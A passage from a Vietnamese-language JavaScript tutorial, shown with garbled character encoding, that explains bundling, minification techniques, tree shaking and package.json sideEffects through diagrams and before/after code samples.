‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                          ‚îÇ
‚îÇ  üìÅ INPUT: Source files (nhi·ªÅu files)                   ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ src/                                               ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ‚îÄ index.js        (10 KB)   ‚Üê Entry point       ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ‚îÄ utils.js        (5 KB)                         ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ‚îÄ api.js          (8 KB)                         ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ‚îÄ components/                                    ‚îÇ
‚îÇ  ‚îÇ       ‚îú‚îÄ‚îÄ Button.js   (3 KB)                         ‚îÇ
‚îÇ  ‚îÇ       ‚îî‚îÄ‚îÄ Input.js    (4 KB)                         ‚îÇ
‚îÇ  ‚îÇ                                                       ‚îÇ
‚îÇ  ‚îÇ   Total: 5 files, 30 KB                             ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ     ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  üîç STEP 1: Dependency Resolution (Ph√¢n t√≠ch ph·ª• thu·ªôc) ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Bundler ƒë·ªçc index.js (entry point)                ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ T√¨m t·∫•t c·∫£ imports/requires trong index.js        ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ ƒê·ªá quy t√¨m imports trong utils.js, api.js, ...    ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ T·∫°o dependency graph (s∆° ƒë·ªì ph·ª• thu·ªôc):           ‚îÇ
‚îÇ      index.js                                           ‚îÇ
‚îÇ        ‚îú‚îÄ utils.js                                      ‚îÇ
‚îÇ        ‚îú‚îÄ api.js                                        ‚îÇ
‚îÇ        ‚îÇ   ‚îî‚îÄ utils.js (ƒë√£ c√≥, skip)                   ‚îÇ
‚îÇ        ‚îî‚îÄ components/                                   ‚îÇ
‚îÇ            ‚îú‚îÄ Button.js                                 ‚îÇ
‚îÇ            ‚îî‚îÄ Input.js                                  ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  üîÑ STEP 2: Transform (Bi·∫øn ƒë·ªïi code)                  ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ TypeScript ‚Üí JavaScript (n·∫øu d√πng TS)             ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ JSX ‚Üí JavaScript (n·∫øu d√πng React)                 ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ ES6+ ‚Üí ES5 (n·∫øu c·∫ßn h·ªó tr·ª£ IE11)                  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ CSS Modules ‚Üí Scoped CSS                          ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  üå≤ STEP 3: Tree Shaking (Lo·∫°i code th·ª´a)             ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Ph√¢n t√≠ch exports/imports                         ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Lo·∫°i b·ªè functions/variables kh√¥ng d√πng           ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ 30 KB ‚Üí 22 KB (lo·∫°i 8 KB code th·ª´a)              ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  üì¶ STEP 4: Bundle (G·ªôp files)                         ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ G·ªôp t·∫•t c·∫£ files th√†nh 1 file                     ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Wrap m·ªói module trong function scope              ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ 22 KB code trong 1 file: bundle.js                ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  üóúÔ∏è STEP 5: Minify (N√©n code)                          ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Remove whitespace, comments                       ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Shorten variable names (userName ‚Üí a)            ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Remove unused code                                ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ 22 KB ‚Üí 8 KB (n√©n 64%!)                           ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  üì§ OUTPUT: Bundle file (1 file duy nh·∫•t)              ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ dist/                                              ‚îÇ
‚îÇ      ‚îî‚îÄ‚îÄ bundle.min.js   (8 KB)  ‚Üê 1 file t·ªëi ∆∞u!     ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  ‚úÖ K·∫æT QU·∫¢: 5 files (30 KB) ‚Üí 1 file (8 KB)          ‚îÇ
‚îÇ  ‚úÖ Gi·∫£m 73% k√≠ch th∆∞·ªõc!                                ‚îÇ
‚îÇ  ‚úÖ Gi·∫£m t·ª´ 5 HTTP requests ‚Üí 1 request!               ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**üíª Code Example - Tr∆∞·ªõc v√† Sau Bundling:**

```typescript
 // Ch√∫ gi·∫£i: ===================================================
// üìÅ TR∆Ø·ªöC BUNDLING - Nhi·ªÅu files ri√™ng bi·ªát
 // Ch√∫ gi·∫£i: ===================================================

 // Ch√∫ gi·∫£i: src/utils.js
export function add(a, b) {
  return a + b;
}

export function subtract(a, b) {
  return a - b;
}

 // Ch√∫ gi·∫£i: src/api.js
import { add } from './utils.js';

export async function fetchData() {
  const response = await fetch('/api/data');
  const data = await response.json();
  return add(data.count, 10); // D√πng add t·ª´ utils
}

 // Ch√∫ gi·∫£i: src/index.js (Entry point)
import { fetchData } from './api.js';
import { subtract } from './utils.js';

async function main() {
  const result = await fetchData();
  const final = subtract(result, 5);
  console.log(final);
}

main();

 // Ch√∫ gi·∫£i: ===================================================
 // Ch√∫ gi·∫£i: üì¶ SAU BUNDLING - 1 file duy nh·∫•t (bundle.js)
 // Ch√∫ gi·∫£i: ===================================================

// dist/bundle.js (Simplified version - th·ª±c t·∫ø ph·ª©c t·∫°p h∆°n)
(function() {
 // Ch√∫ gi·∫£i: Module: utils.js
  const utils = {
    add: function(a, b) { return a + b; },
    subtract: function(a, b) { return a - b; }
  };
  
 // Ch√∫ gi·∫£i: Module: api.js
  const api = {
    fetchData: async function() {
      const response = await fetch('/api/data');
      const data = await response.json();
      return utils.add(data.count, 10);
    }
  };
  
 // Ch√∫ gi·∫£i: Module: index.js (Entry)
  async function main() {
    const result = await api.fetchData();
    const final = utils.subtract(result, 5);
    console.log(final);
  }
  
  main();
})();

 // Ch√∫ gi·∫£i: ‚úÖ T·∫•t c·∫£ code trong 1 file!
// ‚úÖ Modules ƒë∆∞·ª£c wrap trong function scope (tr√°nh global pollution)
// ‚úÖ Dependencies ƒë∆∞·ª£c resolve (utils, api, index)
```

---

**üìö Ph·∫ßn 2: Minify (N√©n Code) - L√†m Code Nh·ªè G·ªçn**

#### **üí° Minify L√† G√¨? (What is Minification?)**

**Minify** l√† qu√° tr√¨nh **lo·∫°i b·ªè t·∫•t c·∫£ k√Ω t·ª± kh√¥ng c·∫ßn thi·∫øt** kh·ªèi code (whitespace, comments, newlines) v√† **r√∫t ng·∫Øn t√™n bi·∫øn** ƒë·ªÉ gi·∫£m k√≠ch th∆∞·ªõc file.

**üî• Minify L√†m G√¨?**

```typescript
 // Ch√∫ gi·∫£i: ===================================================
// üìù TR∆Ø·ªöC MINIFY - Code d·ªÖ ƒë·ªçc (10 KB)
 // Ch√∫ gi·∫£i: ===================================================

// Original code (readable - d·ªÖ ƒë·ªçc)
function calculateTotalPrice(items, taxRate, discount) {
  // Calculate subtotal - T√≠nh t·ªïng ti·ªÅn h√†ng
  let subtotal = 0;
  
  for (let i = 0; i < items.length; i++) {
    const item = items[i];
    subtotal += item.price * item.quantity;
  }
  
  // Apply discount - √Åp d·ª•ng gi·∫£m gi√°
  const discountedPrice = subtotal * (1 - discount / 100);
  
  // Add tax - Th√™m thu·∫ø
  const tax = discountedPrice * (taxRate / 100);
  const total = discountedPrice + tax;
  
  return total;
}

 // Ch√∫ gi·∫£i: Exported function for external use
export { calculateTotalPrice };

 // Ch√∫ gi·∫£i: ===================================================
// üóúÔ∏è SAU MINIFY - Code kh√≥ ƒë·ªçc nh∆∞ng NH·ªé (3 KB)
 // Ch√∫ gi·∫£i: ===================================================

// Minified code (unreadable - kh√≥ ƒë·ªçc nh∆∞ng nh·ªè)
function c(a,b,d){let e=0;for(let f=0;f<a.length;f++){const g=a[f];e+=g.price*g.quantity}const h=e*(1-d/100),i=h*(b/100);return h+i}export{c};

// üéØ NH·ªÆNG G√å ƒê√É THAY ƒê·ªîI:
// ‚úÖ Remove comments (// Calculate subtotal, etc.) ‚Üí Ti·∫øt ki·ªám ~200 bytes
// ‚úÖ Remove whitespace (spaces, tabs) ‚Üí Ti·∫øt ki·ªám ~500 bytes
// ‚úÖ Remove newlines ‚Üí Ti·∫øt ki·ªám ~300 bytes
 // Ch√∫ gi·∫£i: ‚úÖ Shorten variable names:
 // Ch√∫ gi·∫£i: - calculateTotalPrice ‚Üí c
 // Ch√∫ gi·∫£i: - items ‚Üí a
 // Ch√∫ gi·∫£i: - taxRate ‚Üí b
 // Ch√∫ gi·∫£i: - discount ‚Üí d
 // Ch√∫ gi·∫£i: - subtotal ‚Üí e
 // Ch√∫ gi·∫£i: - item ‚Üí g
 // Ch√∫ gi·∫£i: - discountedPrice ‚Üí h
 // Ch√∫ gi·∫£i: - tax ‚Üí i
// ‚úÖ Remove unnecessary semicolons, braces ‚Üí Ti·∫øt ki·ªám ~50 bytes
//
// üìä K·∫æT QU·∫¢: 10 KB ‚Üí 3 KB (Gi·∫£m 70%!)
```

**üîß C√°c K·ªπ Thu·∫≠t Minify Chi Ti·∫øt:**

```typescript
 // Ch√∫ gi·∫£i: ===================================================
// üîß K·ª∏ THU·∫¨T 1: Remove Whitespace & Comments
 // Ch√∫ gi·∫£i: ===================================================

 // Ch√∫ gi·∫£i: Before (v·ªõi whitespace, comments)
function add(a, b) {
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
  return a + b; // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
}

 // Ch√∫ gi·∫£i: After (remove whitespace, comments)
function add(a,b){return a+b}

// Ti·∫øt ki·ªám: ~50 bytes

 // Ch√∫ gi·∫£i: ===================================================
// üîß K·ª∏ THU·∫¨T 2: Shorten Variable Names (Mangle)
 // Ch√∫ gi·∫£i: ===================================================

// Before (t√™n bi·∫øn d√†i, c√≥ nghƒ©a)
function calculateUserTotalScore(userAnswers, correctAnswers) {
  let totalScore = 0;
  for (let index = 0; index < userAnswers.length; index++) {
    if (userAnswers[index] === correctAnswers[index]) {
      totalScore += 10;
    }
  }
  return totalScore;
}

// After (t√™n bi·∫øn ng·∫Øn - 1 k√Ω t·ª±)
function c(a,b){let d=0;for(let e=0;e<a.length;e++){if(a[e]===b[e]){d+=10}}return d}

// Ti·∫øt ki·ªám: ~100 bytes

// ‚ö†Ô∏è L∆ØU √ù: Ch·ªâ mangle LOCAL variables
// KH√îNG mangle exported names (ƒë·ªÉ external code g·ªçi ƒë∆∞·ª£c)

 // Ch√∫ gi·∫£i: ===================================================
// üîß K·ª∏ THU·∫¨T 3: Optimize Boolean Logic
 // Ch√∫ gi·∫£i: ===================================================

 // Ch√∫ gi·∫£i: Before
if (user.isActive === true) {
  console.log('Active');
}

 // Ch√∫ gi·∫£i: After
if(user.isActive)console.log('Active')

 // Ch√∫ gi·∫£i: Before
const value = condition ? true : false;

 // Ch√∫ gi·∫£i: After
const value = !!condition; // Ho·∫∑c: value = condition

 // Ch√∫ gi·∫£i: ===================================================
// üîß K·ª∏ THU·∫¨T 4: Dead Code Elimination
 // Ch√∫ gi·∫£i: ===================================================

 // Ch√∫ gi·∫£i: Before
function process(data) {
  const temp = data * 2; // ‚ùå temp kh√¥ng d√πng
  const result = data + 10;
  return result;
}

 // Ch√∫ gi·∫£i: After (remove unused variable)
function process(a){return a+10}

 // Ch√∫ gi·∫£i: ===================================================
// üîß K·ª∏ THU·∫¨T 5: Constant Folding (G·ªôp h·∫±ng s·ªë)
 // Ch√∫ gi·∫£i: ===================================================

 // Ch√∫ gi·∫£i: Before
const total = 10 + 20 + 30; // T√≠nh l√∫c runtime

 // Ch√∫ gi·∫£i: After
const total = 60; // T√≠nh l√∫c build time

 // Ch√∫ gi·∫£i: Before
const area = Math.PI * 5 * 5; // T√≠nh l√∫c runtime

 // Ch√∫ gi·∫£i: After
const area = 78.53981633974483; // T√≠nh s·∫µn l√∫c build

 // Ch√∫ gi·∫£i: ===================================================
// üîß K·ª∏ THU·∫¨T 6: Property Mangling (Advanced)
 // Ch√∫ gi·∫£i: ===================================================

 // Ch√∫ gi·∫£i: Before
const user = {
  firstName: 'John',
  lastName: 'Doe',
  calculateAge: function() { return 2024 - this.birthYear; }
};

 // Ch√∫ gi·∫£i: After (mangle property names - C·∫®N TH·∫¨N!)
const user = {
  a: 'John', // Ch√∫ gi·∫£i: firstName ‚Üí a
  b: 'Doe', // Ch√∫ gi·∫£i: lastName ‚Üí b
  c: function() { return 2024 - this.d; } // Ch√∫ gi·∫£i: calculateAge ‚Üí c
};

// ‚ö†Ô∏è NGUY HI·ªÇM: N·∫øu external code access user.firstName ‚Üí B·ªä L·ªñI!
// ‚Üí Ch·ªâ d√πng khi ch·∫Øc ch·∫Øn property KH√îNG ƒë∆∞·ª£c access t·ª´ b√™n ngo√†i
```

**üìä Minify Performance Impact:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ           MINIFY IMPACT (·∫¢nh h∆∞·ªüng c·ªßa Minify)          ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                          ‚îÇ
‚îÇ  üì¶ React App Example (Production build):               ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  BEFORE Minify:                                         ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ main.js:          850 KB (code d·ªÖ ƒë·ªçc)            ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ vendor.js:        1.2 MB (libraries)              ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ Total:            2.05 MB                          ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  AFTER Minify:                                          ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ main.min.js:      280 KB (67% nh·ªè h∆°n!) ‚úÖ        ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ vendor.min.js:    420 KB (65% nh·ªè h∆°n!) ‚úÖ        ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ Total:            700 KB                           ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  AFTER Minify + Gzip:                                   ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ main.min.js.gz:   95 KB (89% nh·ªè h∆°n!) üöÄ         ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ vendor.min.js.gz: 145 KB (88% nh·ªè h∆°n!) üöÄ        ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ Total:            240 KB                           ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  ‚è±Ô∏è Load Time Impact (3G network ~400 KB/s):           ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Before: 2.05 MB √∑ 400 KB/s = 5.1 gi√¢y ‚ùå          ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ After Minify: 700 KB √∑ 400 KB/s = 1.75 gi√¢y ‚úÖ    ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ After Minify+Gzip: 240 KB √∑ 400 KB/s = 0.6 gi√¢y üöÄ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  üìà C·∫£i thi·ªán: Nhanh h∆°n 8.5x!                          ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

**üìö Ph·∫ßn 3: Tree Shaking (Lo·∫°i B·ªè Code Th·ª´a) - R≈© C√¢y**

#### **üí° Tree Shaking L√† G√¨?**

**Tree Shaking** l√† qu√° tr√¨nh **lo·∫°i b·ªè dead code** (code kh√¥ng ƒë∆∞·ª£c s·ª≠ d·ª•ng) kh·ªèi bundle. T√™n g·ªçi "r≈© c√¢y" v√¨ gi·ªëng nh∆∞ r≈© c√¢y ƒë·ªÉ l√° ch·∫øt r∆°i xu·ªëng.

**üå≤ C√°ch Ho·∫°t ƒê·ªông:**

```typescript
 // Ch√∫ gi·∫£i: ===================================================
// üì¶ LIBRARY: math-utils.js (Th∆∞ vi·ªán to√°n h·ªçc)
 // Ch√∫ gi·∫£i: ===================================================

// Export 10 functions (nh∆∞ng app ch·ªâ d√πng 2)
export function add(a, b) {
  return a + b;
}

export function subtract(a, b) {
  return a - b;
}

export function multiply(a, b) {
  return a * b;
}

export function divide(a, b) {
  return a / b;
}

export function power(a, b) {
  return Math.pow(a, b);
}

export function sqrt(a) {
  return Math.sqrt(a);
}

export function abs(a) {
  return Math.abs(a);
}

export function round(a) {
  return Math.round(a);
}

export function floor(a) {
  return Math.floor(a);
}

export function ceil(a) {
  return Math.ceil(a);
}

 // Ch√∫ gi·∫£i: ===================================================
// üì± APP: index.js (Ch·ªâ d√πng 2 functions)
 // Ch√∫ gi·∫£i: ===================================================

import { add, subtract } from './math-utils.js';
 // Ch√∫ gi·∫£i: ‚Üë      ‚Üë
 // Ch√∫ gi·∫£i: Ch·ªâ import 2 functions (add, subtract)
//       8 functions c√≤n l·∫°i KH√îNG import

const result1 = add(10, 20);        // ‚úÖ D√πng add
const result2 = subtract(50, 30);   // ‚úÖ D√πng subtract

console.log(result1, result2);

 // Ch√∫ gi·∫£i: ===================================================
// üå≤ TREE SHAKING RESULT (K·∫øt qu·∫£ sau tree shake)
 // Ch√∫ gi·∫£i: ===================================================

// ‚ùå KH√îNG D√ôNG Tree Shaking:
// Bundle ch·ª©a T·∫§T C·∫¢ 10 functions (k·ªÉ c·∫£ 8 functions kh√¥ng d√πng)
 // Ch√∫ gi·∫£i: Bundle size: ~2 KB

// ‚úÖ D√ôNG Tree Shaking:
 // Ch√∫ gi·∫£i: Bundle CH·ªà ch·ª©a 2 functions (add, subtract)
// 8 functions c√≤n l·∫°i b·ªã LO·∫†I B·ªé ho√†n to√†n
 // Ch√∫ gi·∫£i: Bundle size: ~400 bytes

// üìä Gi·∫£m 80% k√≠ch th∆∞·ªõc! üöÄ
```

**üîç Tree Shaking Deep Dive - Ph√¢n T√≠ch Chi Ti·∫øt:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ         TREE SHAKING PROCESS (Quy tr√¨nh r≈© c√¢y)          ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                          ‚îÇ
‚îÇ  üå≥ STEP 1: Build Dependency Tree (X√¢y c√¢y ph·ª• thu·ªôc)  ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ         index.js (Entry)                                ‚îÇ
‚îÇ            ‚îÇ                                             ‚îÇ
‚îÇ            ‚îú‚îÄ import { add, subtract } from math-utils  ‚îÇ
‚îÇ            ‚îÇ                                             ‚îÇ
‚îÇ         math-utils.js                                   ‚îÇ
‚îÇ            ‚îú‚îÄ export add ‚úÖ (USED - ƒë∆∞·ª£c d√πng)          ‚îÇ
‚îÇ            ‚îú‚îÄ export subtract ‚úÖ (USED - ƒë∆∞·ª£c d√πng)     ‚îÇ
‚îÇ            ‚îú‚îÄ export multiply ‚ùå (UNUSED - kh√¥ng d√πng)  ‚îÇ
‚îÇ            ‚îú‚îÄ export divide ‚ùå (UNUSED)                 ‚îÇ
‚îÇ            ‚îú‚îÄ export power ‚ùå (UNUSED)                  ‚îÇ
‚îÇ            ‚îú‚îÄ export sqrt ‚ùå (UNUSED)                   ‚îÇ
‚îÇ            ‚îú‚îÄ export abs ‚ùå (UNUSED)                    ‚îÇ
‚îÇ            ‚îú‚îÄ export round ‚ùå (UNUSED)                  ‚îÇ
‚îÇ            ‚îú‚îÄ export floor ‚ùå (UNUSED)                  ‚îÇ
‚îÇ            ‚îî‚îÄ export ceil ‚ùå (UNUSED)                   ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  ‚úÇÔ∏è STEP 2: Mark Unused Exports (ƒê√°nh d·∫•u kh√¥ng d√πng)  ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Scan t·∫•t c·∫£ imports trong app                     ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ ƒê√°nh d·∫•u exports n√†o ƒë∆∞·ª£c import                  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ Exports KH√îNG ƒë∆∞·ª£c import = UNUSED (th·ª´a)         ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  üóëÔ∏è STEP 3: Remove Dead Code (X√≥a code th·ª´a)          ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Lo·∫°i b·ªè 8 functions kh√¥ng d√πng                    ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ Ch·ªâ gi·ªØ l·∫°i add v√† subtract                       ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ Bundle size: 2 KB ‚Üí 400 bytes                     ‚îÇ
‚îÇ                                                          ‚îÇ
‚îÇ  ‚úÖ OUTPUT: Optimized bundle (Bundle t·ªëi ∆∞u)           ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ Ch·ªâ ch·ª©a code TH·ª∞C S·ª∞ ƒë∆∞·ª£c d√πng                   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**‚ö†Ô∏è ƒêi·ªÅu Ki·ªán ƒê·ªÉ Tree Shaking Ho·∫°t ƒê·ªông:**

```typescript
 // Ch√∫ gi·∫£i: ===================================================
// ‚úÖ Y√äU C·∫¶U 1: D√πng ES Modules (import/export)
 // Ch√∫ gi·∫£i: ===================================================

// ‚úÖ GOOD: ES Modules - Tree shaking ho·∫°t ƒë·ªông
export function add(a, b) {
  return a + b;
}

import { add } from './utils.js';

// ‚ùå BAD: CommonJS - Tree shaking KH√îNG ho·∫°t ƒë·ªông
module.exports = {
  add: function(a, b) { return a + b; }
};

const { add } = require('./utils.js');

 // Ch√∫ gi·∫£i: üîç T·∫†I SAO?
// ES Modules: Static imports (bi·∫øt l√∫c build time exports n√†o ƒë∆∞·ª£c d√πng)
// CommonJS: Dynamic requires (ch·ªâ bi·∫øt l√∫c runtime ‚Üí kh√¥ng tree shake ƒë∆∞·ª£c)

 // Ch√∫ gi·∫£i: ===================================================
// ‚úÖ Y√äU C·∫¶U 2: sideEffects: false trong package.json
 // Ch√∫ gi·∫£i: ===================================================

 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
{
  "name": "my-library",
  "sideEffects": false, // ‚úÖ B√°o: "Safe to remove unused exports"
}

// Ho·∫∑c ch·ªâ ƒë·ªãnh files c√≥ side-effects:
{
  "sideEffects": [
    "*.css",           // CSS files c√≥ side-effects (apply styles globally)
    "*.scss",
    "./src/polyfills.ts" // Polyfills c√≥ side-effects (modify globals)
  ]
}

// üîç SIDE-EFFECTS L√Ä G√å?
// Code c√≥ t√°c d·ª•ng ph·ª• khi import (kh√¥ng ch·ªâ export functions/classes)

// ‚ùå Code c√≥ side-effects (KH√îNG tree shake ƒë∆∞·ª£c):
 // Ch√∫ gi·∫£i: logger.js
